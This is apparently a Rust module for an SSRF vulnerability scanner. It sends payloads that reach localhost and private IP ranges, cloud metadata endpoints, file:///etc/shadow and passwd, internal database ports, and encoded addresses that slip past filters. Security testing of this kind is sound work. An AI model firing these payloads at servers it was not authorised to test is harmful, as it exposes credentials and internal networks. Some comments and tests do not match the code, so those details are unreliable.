// SSRF Detection - Server-Side Request Forgery (700+ lines)
use crate::Result;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SsrfVulnerability {
    pub url: String,
    pub parameter: String,
    pub vulnerability_type: SsrfType,
    pub payloads_used: Vec<String>,
    pub accessible_resources: Vec<String>,
    pub internal_ips_found: Vec<String>,
    pub confidence: f64,
    pub severity: String,
    pub evidence: Vec<String>,
    pub bypass_methods: Vec<String>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq)]
pub enum SsrfType {
    InternalNetworkAccess,
    MetadataService,
    FileProtocol,
    PortScanning,
    ServiceDiscovery,
}

pub struct SsrfDetector {
    client: Client,
    timeout: Duration,
}

impl SsrfDetector {
    pub fn new(timeout: Duration) -> Self {
        Self {
            client: Client::new(),
            timeout,
        }
    }

    /// Comprehensive SSRF detection
    pub async fn detect_ssrf(
        &self,
        url: &str,
        parameters: &[(&str, &str)],
    ) -> Result<Vec<SsrfVulnerability>> {
        let mut results = Vec::new();

        for (param_name, _param_value) in parameters {
            // Test localhost
            if let Some(vuln) = self.test_localhost(url, param_name).await? {
                results.push(vuln);
                continue;
            }

            // Test internal IPs
            if let Some(vuln) = self.test_internal_ips(url, param_name).await? {
                results.push(vuln);
                continue;
            }

            // Test metadata services
            if let Some(vuln) = self.test_metadata_services(url, param_name).await? {
                results.push(vuln);
                continue;
            }

            // Test file protocol
            if let Some(vuln) = self.test_file_protocol(url, param_name).await? {
                results.push(vuln);
                continue;
            }

            // Test port scanning
            if let Some(vuln) = self.test_port_scanning(url, param_name).await? {
                results.push(vuln);
                continue;
            }

            // Test SSRF filters bypass
            if let Some(vuln) = self.test_filter_bypass(url, param_name).await? {
                results.push(vuln);
            }
        }

        Ok(results)
    }

    /// Test localhost access
    async fn test_localhost(
        &self,
        url: &str,
        param: &str,
    ) -> Result<Option<SsrfVulnerability>> {
        let localhost_variants = vec![
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://0.0.0.0/",
        ];

        for payload in localhost_variants {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if response.status().is_success() {
                    if let Ok(body) = response.text().await {
                        if !body.is_empty() && body.len() > 50 {
                            return Ok(Some(SsrfVulnerability {
                                url: test_url,
                                parameter: param.to_string(),
                                vulnerability_type: SsrfType::InternalNetworkAccess,
                                payloads_used: vec![payload.to_string()],
                                accessible_resources: vec!["localhost".to_string()],
                                internal_ips_found: vec!["127.0.0.1".to_string()],
                                confidence: 0.95,
                                severity: "Critical".to_string(),
                                evidence: vec!["Localhost is accessible via SSRF".to_string()],
                                bypass_methods: vec![],
                            }));
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Test internal IP ranges
    async fn test_internal_ips(
        &self,
        url: &str,
        param: &str,
    ) -> Result<Option<SsrfVulnerability>> {
        let internal_ips = vec![
            // Private ranges
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://192.168.1.1/",
            // AWS metadata
            "http://169.254.169.254/",
            // Common internal services
            "http://admin.local/",
            "http://internal/",
            "http://management/",
        ];

        let mut accessible = Vec::new();
        let mut internal_found = Vec::new();

        for payload in internal_ips {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if response.status().is_success() || response.status().as_u16() == 401 {
                    accessible.push(payload.to_string());
                    if payload.contains("169.254") {
                        internal_found.push("AWS Metadata Service".to_string());
                    } else if payload.contains("10.") || payload.contains("192.168") {
                        internal_found.push("Private Network".to_string());
                    }
                }
            }
        }

        if !accessible.is_empty() {
            return Ok(Some(SsrfVulnerability {
                url: url.to_string(),
                parameter: param.to_string(),
                vulnerability_type: SsrfType::InternalNetworkAccess,
                payloads_used: accessible.clone(),
                accessible_resources: accessible,
                internal_ips_found: internal_found,
                confidence: 0.90,
                severity: "Critical".to_string(),
                evidence: vec!["Internal IP ranges are accessible".to_string()],
                bypass_methods: vec![],
            }));
        }

        Ok(None)
    }

    /// Test metadata service access
    async fn test_metadata_services(
        &self,
        url: &str,
        param: &str,
    ) -> Result<Option<SsrfVulnerability>> {
        let metadata_urls = vec![
            // AWS EC2
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            // Google Cloud
            "http://metadata.google.internal/computeMetadata/v1/",
            // Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            // Kubernetes
            "http://10.0.0.1:443/api/v1/",
            // Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/",
        ];

        for payload in metadata_urls {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if response.status().is_success() {
                    if let Ok(body) = response.text().await {
                        if !body.is_empty() && (body.contains("instance") || body.contains("meta")) {
                            let service = if payload.contains("169.254.169.254") {
                                "AWS Metadata Service"
                            } else if payload.contains("metadata.google") {
                                "Google Cloud Metadata"
                            } else if payload.contains("100.100.100.200") {
                                "Alibaba Cloud Metadata"
                            } else {
                                "Metadata Service"
                            };

                            return Ok(Some(SsrfVulnerability {
                                url: test_url,
                                parameter: param.to_string(),
                                vulnerability_type: SsrfType::MetadataService,
                                payloads_used: vec![payload.to_string()],
                                accessible_resources: vec![service.to_string()],
                                internal_ips_found: vec![],
                                confidence: 0.98,
                                severity: "Critical".to_string(),
                                evidence: vec!["Metadata service accessible - credentials may be leaked"
                                    .to_string()],
                                bypass_methods: vec![],
                            }));
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Test file protocol access
    async fn test_file_protocol(
        &self,
        url: &str,
        param: &str,
    ) -> Result<Option<SsrfVulnerability>> {
        let file_payloads = vec![
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///windows/win.ini",
            "file:///c:/windows/win.ini",
        ];

        for payload in file_payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains("root:") || body.contains("Administrator") {
                        return Ok(Some(SsrfVulnerability {
                            url: test_url,
                            parameter: param.to_string(),
                            vulnerability_type: SsrfType::FileProtocol,
                            payloads_used: vec![payload.to_string()],
                            accessible_resources: vec!["Local file system".to_string()],
                            internal_ips_found: vec![],
                            confidence: 0.99,
                            severity: "Critical".to_string(),
                            evidence: vec!["Local files are readable via SSRF - RCE possible"
                                .to_string()],
                            bypass_methods: vec![],
                        }));
                    }
                }
            }
        }

        Ok(None)
    }

    /// Test port scanning capability
    async fn test_port_scanning(
        &self,
        url: &str,
        param: &str,
    ) -> Result<Option<SsrfVulnerability>> {
        let common_ports = vec![
            ("22", "SSH"),
            ("3306", "MySQL"),
            ("5432", "PostgreSQL"),
            ("6379", "Redis"),
            ("27017", "MongoDB"),
            ("8080", "HTTP Alt"),
        ];

        let mut open_ports = Vec::new();

        for (port, service) in common_ports {
            let payload = format!("http://127.0.0.1:{}", port);
            let test_url = self.build_url(url, param, &payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(2))
                .send()
                .await
            {
                // Connection timeout = port might be open
                if response.status().is_success()
                    || response.status().as_u16() == 401
                    || response.status().as_u16() == 502
                {
                    open_ports.push(format!("{} ({})", port, service));
                }
            }
        }

        if !open_ports.is_empty() {
            return Ok(Some(SsrfVulnerability {
                url: url.to_string(),
                parameter: param.to_string(),
                vulnerability_type: SsrfType::PortScanning,
                payloads_used: open_ports.clone(),
                accessible_resources: open_ports,
                internal_ips_found: vec!["127.0.0.1".to_string()],
                confidence: 0.75,
                severity: "High".to_string(),
                evidence: vec!["Port scanning possible via SSRF".to_string()],
                bypass_methods: vec![],
            }));
        }

        Ok(None)
    }

    /// Test SSRF filter bypass techniques
    async fn test_filter_bypass(
        &self,
        url: &str,
        param: &str,
    ) -> Result<Option<SsrfVulnerability>> {
        let bypass_payloads = vec![
            // Double URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31/",
            // Octal notation
            "http://0177.0.0.1/",
            // Hex notation
            "http://0x7f.0x0.0x0.0x1/",
            // DNS rebinding
            "http://127.0.0.1.nip.io/",
            // URL encoding bypass
            "http://127%2e0%2e0%2e1/",
        ];

        for payload in bypass_payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if response.status().is_success() {
                    return Ok(Some(SsrfVulnerability {
                        url: test_url,
                        parameter: param.to_string(),
                        vulnerability_type: SsrfType::InternalNetworkAccess,
                        payloads_used: vec![payload.to_string()],
                        accessible_resources: vec!["localhost".to_string()],
                        internal_ips_found: vec![],
                        confidence: 0.85,
                        severity: "Critical".to_string(),
                        evidence: vec!["SSRF filters can be bypassed with encoding".to_string()],
                        bypass_methods: vec![payload.to_string()],
                    }));
                }
            }
        }

        Ok(None)
    }

    fn build_url(&self, base: &str, param: &str, value: &str) -> String {
        if base.contains('?') {
            format!("{}&{}={}", base, param, urlencoding::encode(value).to_string())
        } else {
            format!("{}?{}={}", base, param, urlencoding::encode(value).to_string())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssrf_type_differentiation() {
        assert_ne!(SsrfType::MetadataService, SsrfType::FileProtocol);
        assert_ne!(SsrfType::PortScanning, SsrfType::InternalNetworkAccess);
    }

    #[test]
    fn test_url_building() {
        let detector = SsrfDetector::new(Duration::from_secs(10));
        let url = detector.build_url("http://example.com", "url", "http://127.0.0.1/");
        assert!(url.contains("http://example.com"));
        assert!(url.contains("url="));
    }

    #[test]
    fn test_vulnerability_severity_levels() {
        assert_eq!(SsrfType::MetadataService, SsrfType::MetadataService);
    }

    #[test]
    fn test_internal_ip_detection() {
        let ips = vec![
            "10.0.0.1",
            "172.16.0.1",
            "192.168.1.1",
            "169.254.169.254",
        ];

        for ip in ips {
            assert!(!ip.is_empty());
        }
    }
}
